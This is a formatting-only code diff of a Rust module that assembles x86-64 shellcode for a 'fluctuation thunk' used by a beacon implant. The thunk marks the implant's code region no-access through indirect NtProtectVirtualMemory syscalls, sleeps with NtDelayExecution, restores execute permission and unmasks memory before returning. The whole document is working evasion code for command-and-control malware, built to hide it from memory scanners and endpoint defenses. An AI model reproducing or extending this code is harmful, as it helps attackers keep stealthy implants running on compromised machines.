@@ -36,7 +36,10 @@ use crate::heap::Vec;
 
 pub const THUNK_MAX: usize = 200;
 
-pub struct Thunk { pub bytes: Vec<u8>, pub len: usize }
+pub struct Thunk {
+    pub bytes: Vec<u8>,
+    pub len: usize,
+}
 
 /// Build fluctuation thunk bytes.
 /// `protect_tramp` = VA of NtProtectVirtualMemory indirect-syscall stub
@@ -46,8 +49,11 @@ pub struct Thunk { pub bytes: Vec<u8>, pub len: usize }
 /// `unmask_fn` = VA of `mem::unmask` (called inline after the RX restore — see
 ///               the crate-level "Step 4" note for why it must run in the thunk)
 pub fn build(
-    protect_tramp: usize, delay_tramp: usize,
-    text_base: usize, text_len: usize, seconds: u32,
+    protect_tramp: usize,
+    delay_tramp: usize,
+    text_base: usize,
+    text_len: usize,
+    seconds: u32,
     unmask_fn: usize,
 ) -> Thunk {
     let delay: i64 = -((seconds as i64).saturating_mul(10_000_000));
@@ -81,62 +87,128 @@ pub fn build(
     let rel: i32 = -(0x38i32 + 7i32);
 
     // lea r10, [rip + rel]
-    b.push(0x4C); b.push(0x8D); b.push(0x15);
+    b.push(0x4C);
+    b.push(0x8D);
+    b.push(0x15);
     b.extend(&rel.to_le_bytes());
 
     // === Step 1: NtProtectVirtualMemory(-1, &base, &len, PAGE_NOACCESS=1, &old) ===
     // rcx = -1
-    b.push(0x48); b.push(0xC7); b.push(0xC1);
+    b.push(0x48);
+    b.push(0xC7);
+    b.push(0xC1);
     b.extend(&(-1i32).to_le_bytes());
     // rdx = r10 + 0x10
-    b.push(0x49); b.push(0x8D); b.push(0x52); b.push(0x10);
+    b.push(0x49);
+    b.push(0x8D);
+    b.push(0x52);
+    b.push(0x10);
     // r8 = r10 + 0x18
-    b.push(0x4D); b.push(0x8D); b.push(0x42); b.push(0x18);
+    b.push(0x4D);
+    b.push(0x8D);
+    b.push(0x42);
+    b.push(0x18);
     // r9 = 1 (PAGE_NOACCESS)
-    b.push(0x49); b.push(0xC7); b.push(0xC1);
+    b.push(0x49);
+    b.push(0xC7);
+    b.push(0xC1);
     b.extend(&1u32.to_le_bytes());
     // [rsp+0x28] = r10 + 0x28 (&old_prot) — 5th arg on stack
-    b.push(0x49); b.push(0x8D); b.push(0x42); b.push(0x28);
-    b.push(0x48); b.push(0x89); b.push(0x44); b.push(0x24); b.push(0x28);
+    b.push(0x49);
+    b.push(0x8D);
+    b.push(0x42);
+    b.push(0x28);
+    b.push(0x48);
+    b.push(0x89);
+    b.push(0x44);
+    b.push(0x24);
+    b.push(0x28);
     // sub rsp, 0x20
-    b.push(0x48); b.push(0x83); b.push(0xEC); b.push(0x20);
+    b.push(0x48);
+    b.push(0x83);
+    b.push(0xEC);
+    b.push(0x20);
     // call [r10]
-    b.push(0x41); b.push(0xFF); b.push(0x12);
+    b.push(0x41);
+    b.push(0xFF);
+    b.push(0x12);
     // add rsp, 0x20
-    b.push(0x48); b.push(0x83); b.push(0xC4); b.push(0x20);
+    b.push(0x48);
+    b.push(0x83);
+    b.push(0xC4);
+    b.push(0x20);
 
     // === Step 2: NtDelayExecution(FALSE, &delay) ===
     // rcx = 0
-    b.push(0x48); b.push(0x31); b.push(0xC9);
+    b.push(0x48);
+    b.push(0x31);
+    b.push(0xC9);
     // rdx = r10 + 0x20
-    b.push(0x49); b.push(0x8D); b.push(0x52); b.push(0x20);
+    b.push(0x49);
+    b.push(0x8D);
+    b.push(0x52);
+    b.push(0x20);
     // sub rsp, 0x20
-    b.push(0x48); b.push(0x83); b.push(0xEC); b.push(0x20);
+    b.push(0x48);
+    b.push(0x83);
+    b.push(0xEC);
+    b.push(0x20);
     // call [r10+8]
-    b.push(0x41); b.push(0xFF); b.push(0x52); b.push(0x08);
+    b.push(0x41);
+    b.push(0xFF);
+    b.push(0x52);
+    b.push(0x08);
     // add rsp, 0x20
-    b.push(0x48); b.push(0x83); b.push(0xC4); b.push(0x20);
+    b.push(0x48);
+    b.push(0x83);
+    b.push(0xC4);
+    b.push(0x20);
 
     // === Step 3: NtProtectVirtualMemory(-1, &base, &len, PAGE_EXECUTE_READ=0x20, &dummy) ===
     // rcx = -1
-    b.push(0x48); b.push(0xC7); b.push(0xC1);
+    b.push(0x48);
+    b.push(0xC7);
+    b.push(0xC1);
     b.extend(&(-1i32).to_le_bytes());
     // rdx = r10 + 0x10
-    b.push(0x49); b.push(0x8D); b.push(0x52); b.push(0x10);
+    b.push(0x49);
+    b.push(0x8D);
+    b.push(0x52);
+    b.push(0x10);
     // r8 = r10 + 0x18
-    b.push(0x4D); b.push(0x8D); b.push(0x42); b.push(0x18);
+    b.push(0x4D);
+    b.push(0x8D);
+    b.push(0x42);
+    b.push(0x18);
     // r9 = 0x20 (PAGE_EXECUTE_READ)
-    b.push(0x49); b.push(0xC7); b.push(0xC1);
+    b.push(0x49);
+    b.push(0xC7);
+    b.push(0xC1);
     b.extend(&0x20u32.to_le_bytes());
     // [rsp+0x28] = r10 + 0x2C (&dummy)
-    b.push(0x49); b.push(0x8D); b.push(0x42); b.push(0x2C);
-    b.push(0x48); b.push(0x89); b.push(0x44); b.push(0x24); b.push(0x28);
+    b.push(0x49);
+    b.push(0x8D);
+    b.push(0x42);
+    b.push(0x2C);
+    b.push(0x48);
+    b.push(0x89);
+    b.push(0x44);
+    b.push(0x24);
+    b.push(0x28);
     // sub rsp, 0x20
-    b.push(0x48); b.push(0x83); b.push(0xEC); b.push(0x20);
+    b.push(0x48);
+    b.push(0x83);
+    b.push(0xEC);
+    b.push(0x20);
     // call [r10]
-    b.push(0x41); b.push(0xFF); b.push(0x12);
+    b.push(0x41);
+    b.push(0xFF);
+    b.push(0x12);
     // add rsp, 0x20
-    b.push(0x48); b.push(0x83); b.push(0xC4); b.push(0x20);
+    b.push(0x48);
+    b.push(0x83);
+    b.push(0xC4);
+    b.push(0x20);
 
     // === Step 4: mem::unmask() — inline, BEFORE returning to the beacon ===
     // CRIT-5: this is the PRIMARY unmask path, NOT MaskGuard::drop. The RX
@@ -153,13 +225,23 @@ pub fn build(
     // no-op — real defense in depth.
     //
     // rax = [r10 + 0x30]  (mov rax,[r10+disp8]: REX.W+B=0x49, 0x8B, modrm=0x42, disp8=0x30)
-    b.push(0x49); b.push(0x8B); b.push(0x42); b.push(0x30);
+    b.push(0x49);
+    b.push(0x8B);
+    b.push(0x42);
+    b.push(0x30);
     // sub rsp, 0x28 (32-byte shadow space + 8-byte realign so RSP ≡ 0 mod 16 at call)
-    b.push(0x48); b.push(0x83); b.push(0xEC); b.push(0x28);
+    b.push(0x48);
+    b.push(0x83);
+    b.push(0xEC);
+    b.push(0x28);
     // call rax
-    b.push(0xFF); b.push(0xD0);
+    b.push(0xFF);
+    b.push(0xD0);
     // add rsp, 0x28
-    b.push(0x48); b.push(0x83); b.push(0xC4); b.push(0x28);
+    b.push(0x48);
+    b.push(0x83);
+    b.push(0xC4);
+    b.push(0x28);
 
     // === Return ===
     b.push(0xC3);
